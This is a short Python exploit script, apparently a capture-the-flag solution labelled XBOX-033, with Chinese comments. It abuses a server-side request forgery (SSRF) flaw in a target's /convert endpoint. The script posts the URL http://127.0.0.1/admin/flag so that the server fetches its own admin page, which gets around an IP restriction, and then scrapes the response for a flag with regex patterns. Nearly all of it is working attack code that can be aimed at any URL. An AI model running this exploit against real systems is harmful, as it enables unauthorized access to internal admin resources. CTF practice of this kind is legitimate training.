# coding:utf-8
import requests
import re
import sys

"""
@文件命名：XBOX-033
@使用方式: python 033.py url
@简述思路: 利用/convert端点的SSRF漏洞，通过服务器本地请求127.0.0.1/admin/flag绕过IP限制获取FLAG
"""


def Scan(url):
    flag = ""
    try:
        # 确保 URL 格式正确
        if not url.startswith("http"):
            url = "http://" + url

        # 移除末尾的斜杠
        url = url.rstrip("/")

        # 构造 SSRF payload
        ssrf_payload = "http://127.0.0.1/admin/flag"

        # 构造请求到 /convert 端点
        convert_url = url + "/convert"

        # 准备 POST 数据
        data = {"url": ssrf_payload}

        # 发送 POST 请求
        response = requests.post(convert_url, data=data, timeout=10)

        # 从响应中提取 FLAG
        # 根据 WriteUp，FLAG 是 UUID 格式
        # 尝试多种正则匹配模式

        # 模式1: 匹配 flag{...} 格式
        flag_pattern1 = r"flag\{[^}]+\}"
        match1 = re.search(flag_pattern1, response.text, re.IGNORECASE)

        # 模式2: 匹配 UUID 格式
        uuid_pattern = r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
        match2 = re.search(uuid_pattern, response.text, re.IGNORECASE)

        # 模式3: 匹配 <p> 标签中的内容
        p_pattern = r"<p>([^<]+)</p>"
        match3 = re.search(p_pattern, response.text)

        if match1:
            flag = match1.group(0)
        elif match2:
            flag = match2.group(0)
        elif match3:
            # 检查 <p> 标签内容是否像 flag
            content = match3.group(1).strip()
            if len(content) > 10:  # FLAG 通常比较长
                flag = content

        # 如果都没匹配到，尝试直接查找包含 "flag" 的行
        if not flag:
            lines = response.text.split("\n")
            for line in lines:
                if "flag" in line.lower() or "-" in line:
                    # 清理 HTML 标签
                    clean_line = re.sub(r"<[^>]+>", "", line).strip()
                    if len(clean_line) > 10:
                        flag = clean_line
                        break

        # 如果还是没有找到，打印响应内容以便调试
        if not flag:
            print("[DEBUG] Response content:")
            print(response.text[:500])  # 打印前500个字符
            flag = "FLAG not found in response"

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        flag = ""
    except Exception as e:
        print(f"[ERROR] {e}")
        flag = ""

    return flag


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python XBOX-SSRF-Admin-Bypass.py <url>")
        print("Example: python XBOX-SSRF-Admin-Bypass.py http://target.com")
        sys.exit(1)

    result = Scan(url=sys.argv[1])
    print(result)
